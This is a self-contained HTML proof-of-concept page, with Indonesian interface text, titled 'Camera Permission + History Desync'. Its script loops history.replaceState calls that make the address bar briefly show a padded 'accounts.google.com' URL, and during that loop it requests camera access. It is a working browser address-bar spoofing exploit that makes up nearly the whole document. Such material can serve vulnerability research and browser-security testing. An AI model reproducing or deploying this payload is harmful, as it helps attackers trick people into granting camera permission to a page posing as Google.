<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Permission + History Desync</title>
<style>
  body { font-family: sans-serif; padding: 40px; text-align: center; }
  .btn { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
  #status { margin-top: 20px; font-family: monospace; color: #666; }
</style>
</head>
<body>

<h2>Camera Permission + History Desync</h2>
<p>Klik tombol di bawah. Perhatikan address bar saat prompt kamera muncul.</p>

<button id="startBtn" class="btn">Trigger Camera & Desync</button>
<div id="status">[*] Ready...</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');
  var counter = 0;
  var isRunning = true;

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Camera Desync] " + msg);
  }

  // ============================================
  // 1. HISTORY DESYNC LOOP
  // ============================================
  function desyncHistory() {
    if (!isRunning) return;

    counter++;
    
    // Ganti URL secara berulang
    history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
    
    setTimeout(function() {
      history.replaceState(null, '', '/');
    }, 0);

    if (counter % 1000 === 0) {
      log('[*] Desync count: ' + counter);
    }

    requestAnimationFrame(desyncHistory);
  }

  // ============================================
  // 2. CAMERA PERMISSION
  // ============================================
  function requestCamera() {
    log("[*] Meminta Izin Kamera...");
    
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(function(stream) {
        log("[+] Kamera DIIZINKAN!");
        stream.getTracks().forEach(function(t) { t.stop(); });
      })
      .catch(function(err) {
        log("[-] Kamera ditolak: " + err.name);
      });
  }

  // ============================================
  // 3. TRIGGER
  // ============================================
  btn.addEventListener('click', function() {
    // Mulai desync
    requestAnimationFrame(desyncHistory);
    
    // Minta kamera setelah 500ms (saat desync berjalan)
    setTimeout(requestCamera, 500);
    
    // Stop desync setelah 10 detik
    setTimeout(function() {
      isRunning = false;
    }, 10000);
  }, { once: true });

})();
</script>

</body>
</html>
